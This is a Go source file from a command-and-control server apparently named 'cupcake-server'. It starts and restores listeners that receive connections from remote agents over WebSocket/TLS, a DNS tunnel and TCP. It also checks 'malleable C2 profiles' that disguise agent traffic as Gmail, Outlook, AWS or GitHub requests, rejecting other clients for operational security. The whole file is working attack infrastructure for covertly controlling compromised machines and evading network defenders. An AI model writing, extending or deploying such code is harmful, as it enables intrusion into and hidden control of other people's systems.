package services

import (
	"context"
	"crypto/tls"
	"cupcake-server/pkg/globals"
	"cupcake-server/internal/storage"
	"cupcake-server/pkg/utils"
	"fmt"
	"log"
	"net/http"
	"os"
	"strings"
	"time"

	"github.com/gorilla/websocket"
	"github.com/miekg/dns"
)

// profileMatchesRequest soft-validates malleable C2 profile markers on the HTTP upgrade.
// Empty profile → always OK. Used for OPSEC (drop non-profile clients when strict).
func profileMatchesRequest(r *http.Request, profile string) bool {
	p := strings.ToLower(strings.TrimSpace(profile))
	if p == "" || p == "default" || p == "any" {
		return true
	}
	ua := r.Header.Get("User-Agent")
	path := r.URL.Path
	switch p {
	case "gmail":
		if !strings.Contains(ua, "Chrome/") {
			return false
		}
		if r.Header.Get("X-Gmail-Travel") == "" && !strings.Contains(path, "/mail/") {
			return false
		}
		return true
	case "outlook":
		if r.Header.Get("X-OWA-Version") == "" && !strings.Contains(path, "/owa/") {
			return false
		}
		return true
	case "aws", "s3", "aws-s3":
		if r.Header.Get("X-Amz-Content-SHA256") == "" && !strings.Contains(ua, "aws-sdk") {
			return false
		}
		return true
	case "github":
		if r.Header.Get("X-GitHub-Api-Version") == "" && !strings.Contains(ua, "GitHub") {
			return false
		}
		return true
	default:
		return true
	}
}

func profileStrictEnabled(ln *globals.Listener) bool {
	if ln != nil && ln.ProfileStrict {
		return true
	}
	v := os.Getenv("CUPCAKE_PROFILE_STRICT")
	return v == "1" || v == "true"
}

func RestoreListeners() {
	time.Sleep(1 * time.Second) // Wait for DB init
	listeners, err := store.GetAllListeners()
	if err != nil {
		log.Printf("Failed to restore listeners: %v", err)
		return
	}

	for _, l := range listeners {
		newLn := &globals.Listener{
			ID:                l.ID,
			BindIP:            l.BindIP,
			Port:              l.Port,
			Protocol:          l.Protocol,
			Note:              l.Note,
			EncryptMode:       l.EncryptMode,
			EncryptKey:        l.EncryptKey,
			EncryptionSalt:    l.EncryptionSalt,
			ObfuscateMode:     l.ObfuscateMode,
			CustomPath:        l.CustomPath,
			Profile:           l.Profile,
			ProfileStrict:     l.ProfileStrict,
			NSDomain:          l.NSDomain,
			PublicDNS:         l.PublicDNS,
			HeartbeatInterval: l.HeartbeatInterval,
			HeartbeatJitter:   l.HeartbeatJitter,
			MaxRetry:          l.MaxRetry,
			Status:            l.Status,
			EnableTLS:         l.EnableTLS,
			TLSCertPath:       l.TLSCertPath,
			TLSKeyPath:        l.TLSKeyPath,
			TLSCertPEM:        l.TLSCertPEM,
			TLSKeyPEM:         l.TLSKeyPEM,
		}

		if newLn.Status == "Running" {
			if err := StartListenerInstance(newLn); err != nil {
				log.Printf("Failed to restart listener %s: %v", newLn.ID, err)
				newLn.Status = "Failed"
			}
		}

		globals.Listeners.Store(newLn.ID, newLn)
	}
}

func StartListenerInstance(ln *globals.Listener) error {
	if ln.Protocol == "WebSocket" {
		mux := http.NewServeMux()
		// Preferred path from listener config (documentation / health checks)
		prefPath := ln.CustomPath
		if prefPath == "" || !strings.HasPrefix(prefPath, "/") {
			// Match client PROFILE_DEFAULT.uri_template (not eternal /ws fingerprint)
			prefPath = "/socket"
		}
		wsHandler := func(w http.ResponseWriter, r *http.Request) {
			// Only upgrade real WebSocket handshakes (malleable profiles may use any path)
			if !websocket.IsWebSocketUpgrade(r) {
				http.NotFound(w, r)
				return
			}
			// M-014: optional profile header/path validation
			if ln.Profile != "" && !profileMatchesRequest(r, ln.Profile) {
				if profileStrictEnabled(ln) {
					log.Printf("[Profile] REJECT path=%s ua=%q profile=%s from %s",
						r.URL.Path, r.Header.Get("User-Agent"), ln.Profile, r.RemoteAddr)
					http.Error(w, "forbidden", http.StatusForbidden)
					return
				}
				log.Printf("[Profile] WARN mismatch path=%s profile=%s from %s (set profile_strict or CUPCAKE_PROFILE_STRICT=1 to reject)",
					r.URL.Path, ln.Profile, r.RemoteAddr)
			}
			conn, err := globals.Upgrader.Upgrade(w, r, nil)
			if err != nil {
				return
			}
			go func(c *websocket.Conn, addr string, l *globals.Listener) {
				defer func() {
					if r := recover(); r != nil {
						log.Printf("[WS] outer panic recovered from %s: %v", addr, r)
					}
				}()
				ProcessWebSocket(c, addr, l)
			}(conn, r.RemoteAddr, ln)
		}
		mux.HandleFunc(prefPath, wsHandler)
		// Catch-all: agents apply profile uri_template (gmail/outlook/…) so path ≠ /ws
		if prefPath != "/" {
			mux.HandleFunc("/", wsHandler)
		}
		ln.HTTPServer = &http.Server{
			Addr:    fmt.Sprintf("%s:%d", ln.BindIP, ln.Port),
			Handler: mux,
		}

		// 🔒 TLS Configuration for Secure WebSocket (wss://)
		if ln.EnableTLS {
			if err := configureTLS(ln); err != nil {
				log.Printf("[TLS] Failed to configure TLS for listener %s: %v", ln.ID, err)
				return err
			}
			log.Printf("[TLS] Secure WebSocket (wss://) enabled on port %d", ln.Port)
		}
	} else if ln.Protocol == "DNS" {
		ln.DNSServer = &dns.Server{
			Addr:    fmt.Sprintf("%s:%d", ln.BindIP, ln.Port),
			Net:     "udp",
			Handler: dns.HandlerFunc(HandleDNSQuery),
		}
	}

	go func() {
		var err error
		if ln.Protocol == "WebSocket" {
			if ln.EnableTLS && ln.HTTPServer.TLSConfig != nil {
				// Start TLS-enabled WebSocket server
				err = ln.HTTPServer.ListenAndServeTLS("", "") // Cert/key already loaded in TLSConfig
			} else {
				// Start plain WebSocket server
				err = ln.HTTPServer.ListenAndServe()
			}
		} else if ln.Protocol == "DNS" {
			err = ln.DNSServer.(*dns.Server).ListenAndServe()
		} else if ln.Protocol == "TCP" {
			StartTCPListener(ln)
			return
		} else if ln.Protocol == "Bind-TCP" || ln.Protocol == "正向TCP" {
			ln.Status = "Running"
			return
		}

		if err != nil && err != http.ErrServerClosed {
			log.Printf("Listener on port %d failed: %v", ln.Port, err)
			ln.Status = "Failed"
		}
	}()
	return nil
}

// 🔒 Configure TLS for Secure WebSocket
func configureTLS(ln *globals.Listener) error {
	// Priority: Inline PEM > File paths
	var cert tls.Certificate
	var err error

	if ln.TLSCertPEM != "" && ln.TLSKeyPEM != "" {
		// Use inline PEM certificates
		cert, err = tls.X509KeyPair([]byte(ln.TLSCertPEM), []byte(ln.TLSKeyPEM))
		if err != nil {
			return fmt.Errorf("failed to parse inline PEM: %v", err)
		}
		log.Printf("[TLS] Using inline PEM certificate for listener %s", ln.ID)
	} else if ln.TLSCertPath != "" && ln.TLSKeyPath != "" {
		// Load from file paths
		cert, err = tls.LoadX509KeyPair(ln.TLSCertPath, ln.TLSKeyPath)
		if err != nil {
			return fmt.Errorf("failed to load cert/key files: %v", err)
		}
		log.Printf("[TLS] Loaded certificate from %s for listener %s", ln.TLSCertPath, ln.ID)
	} else {
		// Generate self-signed certificate for testing/internal use
		cert, err = generateSelfSignedCert()
		if err != nil {
			return fmt.Errorf("failed to generate self-signed cert: %v", err)
		}
		log.Printf("[TLS] Using auto-generated self-signed certificate for listener %s", ln.ID)
	}

	ln.HTTPServer.TLSConfig = &tls.Config{
		Certificates: []tls.Certificate{cert},
		MinVersion:   tls.VersionTLS12, // Enforce TLS 1.2+ for security
	}

	return nil
}

// Generate a self-signed certificate for development/testing
func generateSelfSignedCert() (tls.Certificate, error) {
	return utils.GenerateSelfSignedCert([]string{"localhost", "127.0.0.1", "0.0.0.0"})
}

func StopListenerInstance(ln *globals.Listener) {
	if ln.Protocol == "WebSocket" && ln.HTTPServer != nil {
		ctx, cancel := context.WithTimeout(context.Background(), 2*time.Second)
		defer cancel()
		_ = ln.HTTPServer.Shutdown(ctx)
	}
	if ln.Protocol == "DNS" && ln.DNSServer != nil {
		if srv, ok := ln.DNSServer.(*dns.Server); ok && srv != nil {
			_ = srv.Shutdown()
		}
	}
	if ln.Protocol == "TCP" && ln.TCPServer != nil {
		ln.TCPServer.Close()
	}
	ln.Status = "Stopped"
}

// HandleDNSQuery is defined in dns_tunnel.go (TXT cmd:/alive/ok protocol).

